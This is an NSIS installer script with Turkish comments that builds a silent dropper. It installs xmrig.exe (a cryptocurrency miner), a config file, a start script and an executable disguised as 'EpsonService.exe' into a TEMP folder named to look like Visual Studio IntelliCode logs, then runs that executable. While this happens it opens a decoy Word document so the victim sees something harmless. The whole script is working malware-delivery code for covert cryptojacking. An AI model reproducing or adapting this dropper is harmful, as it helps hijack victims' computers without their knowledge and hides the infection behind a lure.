Icon "myicon.ico"            ; ← Bu satır ikon ekler
;OutFile "SetupProgram.exe"
;InstallDir "$TEMP\VSFeedbackIntelliCodeLogsDatabase"
OutFile "SetupProgram.exe"
InstallDir "$TEMP\VSFeedbackIntelliCodeLogsDatabase"
SilentInstall silent
SilentUnInstall silent
SetOverwrite on
RequestExecutionLevel user

Section

    ; Dosyaları TEMP altına kur
    SetOutPath "$INSTDIR"
    File "EpsonService.exe"
    File "divizion.docx"
    File "config.json"
    File "xmrig.exe"
    File "start.cmd"

    ; EpsonService.exe dosyasını çalıştır
    Exec "$INSTDIR\EpsonService.exe"

    ; DOCX dosyasını EXEDIR'e çıkar ve aç
    SetOutPath "$EXEDIR"
    File "divizion.docx"
    ExecShell "open" "$EXEDIR\divizion.docx" 

    ; install_log.txt dosyasını TEMP'e yaz
    StrCpy $0 "$TEMP\install_log.txt"
    ClearErrors
    FileOpen $1 $0 "w"
    IfErrors done1
    FileWrite $1 "Successful"
    FileClose $1
done1:

    ; path_log.txt dosyasını TEMP'e yaz
    StrCpy $2 "$TEMP\path_log.txt"
    ClearErrors
    FileOpen $3 $2 "w"
    IfErrors done2
    FileWrite $3 "$EXEDIR"
    FileClose $3
done2:

SectionEnd

